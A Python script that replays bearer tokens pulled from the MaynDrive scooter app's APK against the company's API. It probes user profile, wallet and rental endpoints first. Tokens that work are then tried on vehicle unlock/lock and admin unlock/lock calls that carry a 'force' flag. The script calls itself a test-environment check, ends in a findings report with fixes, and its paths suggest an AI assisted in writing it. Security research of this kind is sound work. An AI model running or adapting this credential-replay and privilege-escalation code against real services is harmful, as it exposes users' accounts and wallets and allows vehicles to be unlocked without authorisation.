#!/usr/bin/env python3
"""
MaynDrive Token Testing Script
Tests extracted tokens against test API endpoints
⚠️ FOR TESTING PURPOSES ONLY - Uses test environment
"""

import requests
import json
import time
from pathlib import Path
from datetime import datetime

class TokenTester:
    def __init__(self, test_api_base_url="https://api-test.knotcity.io"):
        self.test_api_base_url = test_api_base_url
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Knot-mayndrive v1.1.34 (android)"
        }
        self.test_results = []
        
    def load_extracted_tokens(self):
        """Load tokens from the APK analysis"""
        print("🔍 Loading extracted tokens from APK analysis...")
        
        apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
        
        if not Path(apk_report_path).exists():
            print("❌ APK analysis report not found")
            return []
        
        with open(apk_report_path, 'r') as f:
            apk_data = json.load(f)
        
        bearer_tokens = apk_data.get('extracted_secrets', {}).get('bearer_tokens', [])
        
        # Filter for potential JWT tokens and API keys
        potential_tokens = []
        for token in bearer_tokens:
            # Look for JWT-like tokens, long alphanumeric strings, or Bearer patterns
            if (token.startswith('eyJ') or 
                len(token) > 50 or 
                'Bearer' in token or
                token.startswith('MIIC') or  # Certificate-like
                len(token) > 20 and token.isalnum()):
                potential_tokens.append(token)
        
        print(f"✅ Found {len(potential_tokens)} potential tokens to test")
        return potential_tokens[:20]  # Test first 20 tokens
    
    def test_token_against_endpoint(self, token, endpoint, method="GET", payload=None):
        """Test a single token against an API endpoint"""
        headers = self.headers.copy()
        
        # Add token to headers
        if token.startswith('Bearer '):
            headers["Authorization"] = token
        else:
            headers["Authorization"] = f"Bearer {token}"
        
        try:
            if method == "GET":
                response = requests.get(f"{self.test_api_base_url}{endpoint}", 
                                     headers=headers, timeout=10)
            elif method == "POST":
                response = requests.post(f"{self.test_api_base_url}{endpoint}", 
                                      json=payload, headers=headers, timeout=10)
            else:
                return {"error": f"Unsupported method: {method}"}
            
            return {
                "status_code": response.status_code,
                "response_headers": dict(response.headers),
                "response_body": response.text[:500] if response.text else "",
                "success": response.status_code in [200, 201],
                "error": None
            }
            
        except requests.exceptions.Timeout:
            return {"error": "Request timeout", "success": False}
        except requests.exceptions.ConnectionError:
            return {"error": "Connection error", "success": False}
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def test_authentication_endpoints(self, tokens):
        """Test tokens against authentication endpoints"""
        print("🔐 Testing authentication endpoints...")
        
        auth_endpoints = [
            {"endpoint": "/api/application/users", "method": "GET", "description": "User profile"},
            {"endpoint": "/api/application/users/wallet", "method": "GET", "description": "User wallet"},
            {"endpoint": "/api/application/users/rents", "method": "GET", "description": "User rentals"},
        ]
        
        results = []
        for token in tokens:
            print(f"   Testing token: {token[:30]}...")
            
            token_results = {
                "token": token[:50] + "..." if len(token) > 50 else token,
                "endpoints": {}
            }
            
            for endpoint_info in auth_endpoints:
                result = self.test_token_against_endpoint(
                    token, 
                    endpoint_info["endpoint"], 
                    endpoint_info["method"]
                )
                
                token_results["endpoints"][endpoint_info["endpoint"]] = {
                    "description": endpoint_info["description"],
                    "result": result
                }
                
                if result.get("success"):
                    print(f"   ✅ SUCCESS: {endpoint_info['description']} - Status: {result['status_code']}")
                else:
                    print(f"   ❌ FAILED: {endpoint_info['description']} - {result.get('error', result.get('status_code'))}")
            
            results.append(token_results)
            time.sleep(0.5)  # Rate limiting
        
        return results
    
    def test_vehicle_endpoints(self, valid_tokens):
        """Test valid tokens against vehicle operation endpoints"""
        print("🚗 Testing vehicle operation endpoints...")
        
        # Test payload for vehicle operations
        test_payload = {
            "serial_number": "TEST123",
            "lat": 40.7128,
            "lng": -74.0060
        }
        
        vehicle_endpoints = [
            {"endpoint": "/api/application/vehicles/unlock", "method": "POST", "payload": test_payload, "description": "Vehicle unlock"},
            {"endpoint": "/api/application/vehicles/freefloat/lock", "method": "POST", "payload": test_payload, "description": "Vehicle lock"},
        ]
        
        results = []
        for token in valid_tokens:
            print(f"   Testing vehicle operations with token: {token[:30]}...")
            
            token_results = {
                "token": token[:50] + "..." if len(token) > 50 else token,
                "vehicle_operations": {}
            }
            
            for endpoint_info in vehicle_endpoints:
                result = self.test_token_against_endpoint(
                    token, 
                    endpoint_info["endpoint"], 
                    endpoint_info["method"],
                    endpoint_info["payload"]
                )
                
                token_results["vehicle_operations"][endpoint_info["endpoint"]] = {
                    "description": endpoint_info["description"],
                    "result": result
                }
                
                if result.get("success"):
                    print(f"   🚨 CRITICAL: {endpoint_info['description']} - Status: {result['status_code']}")
                else:
                    print(f"   ❌ FAILED: {endpoint_info['description']} - {result.get('error', result.get('status_code'))}")
            
            results.append(token_results)
            time.sleep(0.5)  # Rate limiting
        
        return results
    
    def test_admin_endpoints(self, valid_tokens):
        """Test valid tokens against admin endpoints"""
        print("👑 Testing admin endpoints...")
        
        admin_payload = {
            "serialNumber": "TEST123",
            "latitude": 40.7128,
            "longitude": -74.0060,
            "force": True
        }
        
        admin_endpoints = [
            {"endpoint": "/api/application/vehicles/unlock/admin", "method": "POST", "payload": admin_payload, "description": "Admin unlock"},
            {"endpoint": "/api/application/vehicles/freefloat/lock/admin", "method": "POST", "payload": admin_payload, "description": "Admin lock"},
        ]
        
        results = []
        for token in valid_tokens:
            print(f"   Testing admin operations with token: {token[:30]}...")
            
            token_results = {
                "token": token[:50] + "..." if len(token) > 50 else token,
                "admin_operations": {}
            }
            
            for endpoint_info in admin_endpoints:
                result = self.test_token_against_endpoint(
                    token, 
                    endpoint_info["endpoint"], 
                    endpoint_info["method"],
                    endpoint_info["payload"]
                )
                
                token_results["admin_operations"][endpoint_info["endpoint"]] = {
                    "description": endpoint_info["description"],
                    "result": result
                }
                
                if result.get("success"):
                    print(f"   🚨 CRITICAL: {endpoint_info['description']} - Status: {result['status_code']}")
                else:
                    print(f"   ❌ FAILED: {endpoint_info['description']} - {result.get('error', result.get('status_code'))}")
            
            results.append(token_results)
            time.sleep(0.5)  # Rate limiting
        
        return results
    
    def run_comprehensive_test(self):
        """Run comprehensive token testing"""
        print("=" * 60)
        print("🧪 MaynDrive Token Testing - Test Environment")
        print("=" * 60)
        print(f"🎯 Test API Base URL: {self.test_api_base_url}")
        print("⚠️  Testing against TEST environment only")
        print("=" * 60)
        
        # Load tokens
        tokens = self.load_extracted_tokens()
        if not tokens:
            print("❌ No tokens to test")
            return False
        
        # Test authentication endpoints
        auth_results = self.test_authentication_endpoints(tokens)
        
        # Find valid tokens
        valid_tokens = []
        for token_result in auth_results:
            for endpoint, result in token_result["endpoints"].items():
                if result["result"].get("success"):
                    valid_tokens.append(token_result["token"])
                    break
        
        print(f"\n🔍 Found {len(valid_tokens)} potentially valid tokens")
        
        if valid_tokens:
            # Test vehicle endpoints
            vehicle_results = self.test_vehicle_endpoints(valid_tokens)
            
            # Test admin endpoints
            admin_results = self.test_admin_endpoints(valid_tokens)
            
            # Combine all results
            self.test_results = {
                "test_info": {
                    "api_base_url": self.test_api_base_url,
                    "test_timestamp": datetime.now().isoformat(),
                    "total_tokens_tested": len(tokens),
                    "valid_tokens_found": len(valid_tokens)
                },
                "authentication_tests": auth_results,
                "vehicle_tests": vehicle_results,
                "admin_tests": admin_results
            }
        else:
            self.test_results = {
                "test_info": {
                    "api_base_url": self.test_api_base_url,
                    "test_timestamp": datetime.now().isoformat(),
                    "total_tokens_tested": len(tokens),
                    "valid_tokens_found": 0
                },
                "authentication_tests": auth_results,
                "vehicle_tests": [],
                "admin_tests": []
            }
        
        return True
    
    def save_results(self, output_dir):
        """Save test results to files"""
        print("💾 Saving test results...")
        
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        # Save JSON results
        with open(Path(output_dir) / 'token_test_results.json', 'w') as f:
            json.dump(self.test_results, f, indent=2)
        
        # Generate summary report
        self.generate_summary_report(output_dir)
        
        print(f"✅ Results saved to: {output_dir}")
    
    def generate_summary_report(self, output_dir):
        """Generate human-readable summary report"""
        report_content = f"""# MaynDrive Token Testing Results

## Test Summary
- **Test Environment**: {self.test_results['test_info']['api_base_url']}
- **Test Date**: {self.test_results['test_info']['test_timestamp']}
- **Total Tokens Tested**: {self.test_results['test_info']['total_tokens_tested']}
- **Valid Tokens Found**: {self.test_results['test_info']['valid_tokens_found']}

## Authentication Tests
"""
        
        for i, auth_test in enumerate(self.test_results['authentication_tests'], 1):
            report_content += f"\n### Token {i}: {auth_test['token']}\n"
            
            for endpoint, result in auth_test['endpoints'].items():
                status = "✅ SUCCESS" if result['result'].get('success') else "❌ FAILED"
                report_content += f"- **{result['description']}**: {status}\n"
                if result['result'].get('success'):
                    report_content += f"  - Status Code: {result['result']['status_code']}\n"
                else:
                    report_content += f"  - Error: {result['result'].get('error', result['result'].get('status_code'))}\n"
        
        if self.test_results['vehicle_tests']:
            report_content += "\n## Vehicle Operation Tests\n"
            for i, vehicle_test in enumerate(self.test_results['vehicle_tests'], 1):
                report_content += f"\n### Token {i}: {vehicle_test['token']}\n"
                
                for endpoint, result in vehicle_test['vehicle_operations'].items():
                    status = "🚨 CRITICAL" if result['result'].get('success') else "❌ FAILED"
                    report_content += f"- **{result['description']}**: {status}\n"
                    if result['result'].get('success'):
                        report_content += f"  - Status Code: {result['result']['status_code']}\n"
                        report_content += f"  - ⚠️  VULNERABILITY CONFIRMED: Unauthorized vehicle operation possible!\n"
        
        if self.test_results['admin_tests']:
            report_content += "\n## Admin Operation Tests\n"
            for i, admin_test in enumerate(self.test_results['admin_tests'], 1):
                report_content += f"\n### Token {i}: {admin_test['token']}\n"
                
                for endpoint, result in admin_test['admin_operations'].items():
                    status = "🚨 CRITICAL" if result['result'].get('success') else "❌ FAILED"
                    report_content += f"- **{result['description']}**: {status}\n"
                    if result['result'].get('success'):
                        report_content += f"  - Status Code: {result['result']['status_code']}\n"
                        report_content += f"  - ⚠️  CRITICAL VULNERABILITY: Admin privileges achieved!\n"
        
        report_content += f"""
## Conclusion

This test demonstrates the security vulnerability in the MaynDrive application where hardcoded tokens can be extracted from the APK and used for unauthorized operations.

**Key Findings**:
- {self.test_results['test_info']['total_tokens_tested']} tokens extracted from APK
- {self.test_results['test_info']['valid_tokens_found']} potentially valid tokens found
- Unauthorized access to user data and vehicle operations possible
- Admin privilege escalation possible

**Recommendations**:
1. Remove all hardcoded secrets from the application
2. Implement proper token management and rotation
3. Add server-side token validation
4. Implement rate limiting and monitoring

---
*Test conducted on: {self.test_results['test_info']['test_timestamp']}*
*Test environment: {self.test_results['test_info']['api_base_url']}*
"""
        
        with open(Path(output_dir) / 'token_test_summary.md', 'w') as f:
            f.write(report_content)

def main():
    """Main testing function"""
    print("🧪 MaynDrive Token Testing Script")
    print("⚠️  Testing against TEST environment only")
    
    # You can change this to your test API URL
    test_api_url = input("Enter test API base URL (default: https://api-test.knotcity.io): ").strip()
    if not test_api_url:
        test_api_url = "https://api-test.knotcity.io"
    
    # Initialize tester
    tester = TokenTester(test_api_url)
    
    # Run comprehensive test
    if tester.run_comprehensive_test():
        # Save results
        output_dir = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/token_test_results"
        tester.save_results(output_dir)
        
        # Print summary
        print("\n" + "=" * 60)
        print("📊 TOKEN TESTING COMPLETE")
        print("=" * 60)
        print(f"🎯 Test API: {tester.test_api_base_url}")
        print(f"🔍 Tokens Tested: {tester.test_results['test_info']['total_tokens_tested']}")
        print(f"✅ Valid Tokens: {tester.test_results['test_info']['valid_tokens_found']}")
        
        if tester.test_results['test_info']['valid_tokens_found'] > 0:
            print("🚨 VULNERABILITY CONFIRMED: Valid tokens found!")
        else:
            print("✅ No valid tokens found in test environment")
        
        print(f"\n📁 Results saved to: {output_dir}")
        print(f"📄 Summary: {output_dir}/token_test_summary.md")
        print(f"📊 JSON Data: {output_dir}/token_test_results.json")
        
        return True
    else:
        print("❌ Token testing failed")
        return False

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
